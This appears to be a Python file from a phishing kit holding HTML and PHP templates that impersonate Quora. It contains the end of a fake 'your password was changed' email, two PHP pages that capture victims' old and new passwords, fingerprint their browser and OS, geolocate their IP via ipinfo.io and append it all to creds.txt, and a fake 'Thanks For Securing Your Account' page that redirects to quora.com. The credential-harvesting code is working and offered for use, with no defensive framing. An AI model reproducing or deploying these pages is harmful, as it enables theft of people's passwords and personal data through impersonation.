              <!--[if (mso)|(IE)]><td align="center" width="500" style=" width:500px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->
            <div class="col num12" style="min-width: 320px;max-width: 500px;display: table-cell;vertical-align: top;">
              <div style="background-color: transparent; width: 100% !important;">
              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->

                  
                    <div align="center" class="img-container center fixedwidth " style="padding-right: 0px;  padding-left: 0px;">
<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr style="line-height:0px;line-height:0px;"><td style="padding-right: 0px; padding-left: 0px;" align="center"><![endif]-->
  <img class="center fixedwidth" align="center" border="0" src="http://icons-for-free.com/free-icons/png/512/1696902.png" alt="Image" title="Image" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: block !important;border: 0;height: auto;float: none;width: 100%;max-width: 125px" width="125">
<!--[if mso]></td></tr></table><![endif]-->
</div>

                  
                  
                    
<table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider " style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
    <tbody>
        <tr style="vertical-align: top">
            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                    <tbody>
                        <tr style="vertical-align: top">
                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                                <span></span>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    </tbody>
</table>
                  
                  
                    <div class="">
  <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->
  <div style="color:#555555;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">  
    <div style="font-size:12px;line-height:14px;color:#555555;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><strong><span style="font-size: 16px; line-height: 19px;">Hello [NAME], Your password was changed, Thanks for securing your account.</span></strong></p></div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
                  
                    
<table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider " style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
    <tbody>
        <tr style="vertical-align: top">
            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                    <tbody>
                        <tr style="vertical-align: top">
                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">
                                <span></span>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
    </tbody>
</table>
                  
                  
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>
   <!--[if (mso)|(IE)]></td></tr></table><![endif]-->
    </td>
  </tr>
  </tbody>
  </table>
  <!--[if (mso)|(IE)]></div><![endif]-->


</body></html>"""































































Login_Quora = """<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php


   function getBrowserOS() {

       $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
       $browser        =   "Unknown Browser";
       $os_platform    =   "Unknown OS Platform";

       // Get the Operating System Platform

           if (preg_match('/windows|win32/i', $user_agent)) {

               $os_platform    =   'Windows';

               if (preg_match('/windows nt 6.2/i', $user_agent)) {

                   $os_platform    .=  " 8";

               } else if (preg_match('/windows nt 6.1/i', $user_agent)) {

                   $os_platform    .=  " 7";

               } else if (preg_match('/windows nt 6.0/i', $user_agent)) {

                   $os_platform    .=  " Vista";

               } else if (preg_match('/windows nt 5.2/i', $user_agent)) {

                   $os_platform    .=  " Server 2003/XP x64";

               } else if (preg_match('/windows nt 5.1/i', $user_agent) || preg_match('/windows xp/i', $user_agent)) {

                   $os_platform    .=  " XP";

               } else if (preg_match('/windows nt 5.0/i', $user_agent)) {

                   $os_platform    .=  " 2000";

               } else if (preg_match('/windows me/i', $user_agent)) {

                   $os_platform    .=  " ME";

               } else if (preg_match('/win98/i', $user_agent)) {

                   $os_platform    .=  " 98";

               } else if (preg_match('/win95/i', $user_agent)) {

                   $os_platform    .=  " 95";

               } else if (preg_match('/win16/i', $user_agent)) {

                   $os_platform    .=  " 3.11";

               }

           } else if (preg_match('/macintosh|mac os x/i', $user_agent)) {

               $os_platform    =   'Mac';

               if (preg_match('/macintosh/i', $user_agent)) {

                   $os_platform    .=  " OS X";

               } else if (preg_match('/mac_powerpc/i', $user_agent)) {

                   $os_platform    .=  " OS 9";

               }

           } else if (preg_match('/linux/i', $user_agent)) {

               $os_platform    =   "Linux";

           }

           // Override if matched

               if (preg_match('/iphone/i', $user_agent)) {

                   $os_platform    =   "iPhone";

               } else if (preg_match('/android/i', $user_agent)) {

                   $os_platform    =   "Android";

               } else if (preg_match('/blackberry/i', $user_agent)) {

                   $os_platform    =   "BlackBerry";

               } else if (preg_match('/webos/i', $user_agent)) {

                   $os_platform    =   "Mobile";

               } else if (preg_match('/ipod/i', $user_agent)) {

                   $os_platform    =   "iPod";

               } else if (preg_match('/ipad/i', $user_agent)) {

                   $os_platform    =   "iPad";

               }

       // Get the Browser

           if (preg_match('/msie/i', $user_agent) && !preg_match('/opera/i', $user_agent)) {

               $browser        =   "Internet Explorer";

           } else if (preg_match('/firefox/i', $user_agent)) {

               $browser        =   "Firefox";

           } else if (preg_match('/chrome/i', $user_agent)) {

               $browser        =   "Chrome";

           } else if (preg_match('/safari/i', $user_agent)) {

               $browser        =   "Safari";

           } else if (preg_match('/opera/i', $user_agent)) {

               $browser        =   "Opera";

           } else if (preg_match('/netscape/i', $user_agent)) {

               $browser        =   "Netscape";

           }

           // Override if matched

               if ($os_platform == "iPhone" || $os_platform == "Android" || $os_platform == "BlackBerry" || $os_platform == "Mobile" || $os_platform == "iPod" || $os_platform == "iPad") {

                   if (preg_match('/mobile/i', $user_agent)) {

                       $browser    =   "Handheld Browser";

                   }

               }

       // Create a Data Array

           return array(
               'browser'       =>  $browser,
               'os_platform'   =>  $os_platform
           );

   }


   $user_agent     =   getBrowserOS();



//If Submit Button Is Clicked Do the Following
if ($_POST['save']){

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$info = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$myFile = "creds.txt";
$fh = fopen($myFile, 'a') or die("can't open file");

$IPDATA ="\\033[1;30m[\\033[0mIP\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->ip . "\\n" . "\\033[1;30m[\\033[0mCITY\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->city . "\\n" . "\\033[1;30m[\\033[0mREGION\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->region . "\\n" . "\\033[1;30m[\\033[0mCOUNTRY\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->country . "\\n" . "\\033[1;30m[\\033[0mLOCATION\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->loc . "\\n" . "\\033[1;30m[\\033[0mORG\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->org . "\\n";

fwrite($fh, $IPDATA);

$stringData = "\\n" . "\\033[1;30m[\\033[0;31mOLD-PASS\\033[1;30m]\\033[0;33m:\\033[0m " . $_POST['old_pass'] . "\\n" . "\\033[1;30m[\\033[0;31mNEW-PASS\\033[1;30m]\\033[0;33m:\\033[0m " . $_POST['new_pass'] . "\\n" . "\\033[1;30m[\\033[0;31mCFM-PASS\\033[1;30m]\\033[0;33m:\\033[0m " . $_POST['cfm_pass'] . "\\n\\n" . "\\033[1;30m[\\033[0mOS\\033[1;30m]\\033[0;33m:\\033[0;34m " . $user_agent['os_platform'] . "\\n" . "\\033[1;30m[\\033[0mUSER-AGENT\\033[1;30m]\\033[0;33m:\\033[0;34m " . $_SERVER['HTTP_USER_AGENT'] . "\\n\\n";

fwrite($fh, $stringData);
fclose($fh);

} ?>


<script>location.href='pass_changed.html';</script>

 </body>

</html>
"""




























































Login1_Quora = """<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php


   function getBrowserOS() {

       $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
       $browser        =   "Unknown Browser";
       $os_platform    =   "Unknown OS Platform";

       // Get the Operating System Platform

           if (preg_match('/windows|win32/i', $user_agent)) {

               $os_platform    =   'Windows';

               if (preg_match('/windows nt 6.2/i', $user_agent)) {

                   $os_platform    .=  " 8";

               } else if (preg_match('/windows nt 6.1/i', $user_agent)) {

                   $os_platform    .=  " 7";

               } else if (preg_match('/windows nt 6.0/i', $user_agent)) {

                   $os_platform    .=  " Vista";

               } else if (preg_match('/windows nt 5.2/i', $user_agent)) {

                   $os_platform    .=  " Server 2003/XP x64";

               } else if (preg_match('/windows nt 5.1/i', $user_agent) || preg_match('/windows xp/i', $user_agent)) {

                   $os_platform    .=  " XP";

               } else if (preg_match('/windows nt 5.0/i', $user_agent)) {

                   $os_platform    .=  " 2000";

               } else if (preg_match('/windows me/i', $user_agent)) {

                   $os_platform    .=  " ME";

               } else if (preg_match('/win98/i', $user_agent)) {

                   $os_platform    .=  " 98";

               } else if (preg_match('/win95/i', $user_agent)) {

                   $os_platform    .=  " 95";

               } else if (preg_match('/win16/i', $user_agent)) {

                   $os_platform    .=  " 3.11";

               }

           } else if (preg_match('/macintosh|mac os x/i', $user_agent)) {

               $os_platform    =   'Mac';

               if (preg_match('/macintosh/i', $user_agent)) {

                   $os_platform    .=  " OS X";

               } else if (preg_match('/mac_powerpc/i', $user_agent)) {

                   $os_platform    .=  " OS 9";

               }

           } else if (preg_match('/linux/i', $user_agent)) {

               $os_platform    =   "Linux";

           }

           // Override if matched

               if (preg_match('/iphone/i', $user_agent)) {

                   $os_platform    =   "iPhone";

               } else if (preg_match('/android/i', $user_agent)) {

                   $os_platform    =   "Android";

               } else if (preg_match('/blackberry/i', $user_agent)) {

                   $os_platform    =   "BlackBerry";

               } else if (preg_match('/webos/i', $user_agent)) {

                   $os_platform    =   "Mobile";

               } else if (preg_match('/ipod/i', $user_agent)) {

                   $os_platform    =   "iPod";

               } else if (preg_match('/ipad/i', $user_agent)) {

                   $os_platform    =   "iPad";

               }

       // Get the Browser

           if (preg_match('/msie/i', $user_agent) && !preg_match('/opera/i', $user_agent)) {

               $browser        =   "Internet Explorer";

           } else if (preg_match('/firefox/i', $user_agent)) {

               $browser        =   "Firefox";

           } else if (preg_match('/chrome/i', $user_agent)) {

               $browser        =   "Chrome";

           } else if (preg_match('/safari/i', $user_agent)) {

               $browser        =   "Safari";

           } else if (preg_match('/opera/i', $user_agent)) {

               $browser        =   "Opera";

           } else if (preg_match('/netscape/i', $user_agent)) {

               $browser        =   "Netscape";

           }

           // Override if matched

               if ($os_platform == "iPhone" || $os_platform == "Android" || $os_platform == "BlackBerry" || $os_platform == "Mobile" || $os_platform == "iPod" || $os_platform == "iPad") {

                   if (preg_match('/mobile/i', $user_agent)) {

                       $browser    =   "Handheld Browser";

                   }

               }

       // Create a Data Array

           return array(
               'browser'       =>  $browser,
               'os_platform'   =>  $os_platform
           );

   }


   $user_agent     =   getBrowserOS();



//If Submit Button Is Clicked Do the Following
if ($_POST['save']){

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$info = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$myFile = "creds.txt";
$fh = fopen($myFile, 'a') or die("can't open file");

$IPDATA ="\\033[1;30m[\\033[0mIP\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->ip . "\\n" . "\\033[1;30m[\\033[0mCITY\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->city . "\\n" . "\\033[1;30m[\\033[0mREGION\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->region . "\\n" . "\\033[1;30m[\\033[0mCOUNTRY\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->country . "\\n" . "\\033[1;30m[\\033[0mLOCATION\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->loc . "\\n" . "\\033[1;30m[\\033[0mORG\\033[1;30m]\\033[0;33m:\\033[0;33m " . $info->org . "\\n";

fwrite($fh, $IPDATA);

$stringData = "\\n" . "\\033[1;30m[\\033[0;31mOLD-PASS\\033[1;30m]\\033[0;33m:\\033[0m " . $_POST['input'] . "\\n" . "\\033[1;30m[\\033[0;31mNEW-PASS\\033[1;30m]\\033[0;33m:\\033[0m " . $_POST['input1'] . "\\n\\n" . "\\033[1;30m[\\033[0mOS\\033[1;30m]\\033[0;33m:\\033[0;34m " . $user_agent['os_platform'] . "\\n" . "\\033[1;30m[\\033[0mUSER-AGENT\\033[1;30m]\\033[0;33m:\\033[0;34m " . $_SERVER['HTTP_USER_AGENT'] . "\\n\\n";

fwrite($fh, $stringData);
fclose($fh);

} ?>


<script>location.href='pass_changed.html';</script>

 </body>

</html>

"""












































































Secured_Quora = """<head>
  
  <link rel="shortcut icon" href="http://www.stickpng.com/assets/images/5841c704a6515b1e0ad75aab.png" />
  <title>Quora</title>
  <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
  <meta http-equiv="refresh" content="10;url=http://www.quora.com" />
  <style type="text/css">
    
    body {

      background-color: #fff;
      font-family: 'Lato', sans-serif;

    }

    h1 {


      color: #3C3B3B;
      font-size: 23px;
      text-align: center;


    }

    p {
      width: 300px;
      color: #999;
      padding-top: 40px;
      text-align: center;
    }

    h4 {

      color: white;
      padding-top: 100px;
      text-align: center;

    }

    img {

      align-items: center;
    }


  </style>

</head>
<body>
<br>
<center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Quora_logo_2015.svg/2000px-Quora_logo_2015.svg.png" width="400" height="140"></center>
<center><h1>Thanks For Securing Your Account!</h1></center>
<center><p><b>if you need any help visit our Support Page at help.quora.com</b> </p></center>


</body>

</html>"""